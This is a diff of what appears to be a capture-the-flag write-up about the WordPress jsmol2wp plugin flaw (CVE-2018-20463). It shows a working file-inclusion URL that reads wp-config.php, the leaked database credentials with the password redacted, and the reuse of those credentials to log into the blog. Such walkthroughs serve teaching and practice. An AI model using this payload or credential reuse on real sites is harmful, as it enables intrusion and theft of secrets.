@@ -28,7 +28,20 @@ Among others, we are able to identify the follwing vulnerability.
  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
  |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 ```
-Following up the first link, we can see a proof of concept allowing us to include files on the server into the rendered webpage.
+Following up the first link, we can see a proof of concept, allegedly allowing us to include files of the server into the rendered webpage.
 ```
 http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
 ```
+
+## Establish a Foothold
+Executing the actual PoC (of course after having exchanged domain and port) already yields an interesting finding, since we can find the credentials of the MySQL user that is being used by Wordpress.
+```
+...
+/** Database username */
+define( 'DB_USER', 'wpuser' );
+
+/** Database password */
+define( 'DB_PASSWORD', -REDACTED- );
+...
+```
+If the people that set up the server were cautious, they of course didn't reuse these credentials for an actual user of the Wordpress blog. But as Einstein indicated, we all do have not so bright moments, so it's definitely worth to check if we can login with the `wpuser` user. Since the login page is not visible on the home site, one can open the blog article about RCEs and try to comment under it, which redirects to the login. And in fact, we succesfully bypass the first line of security with the credentials that we have found.
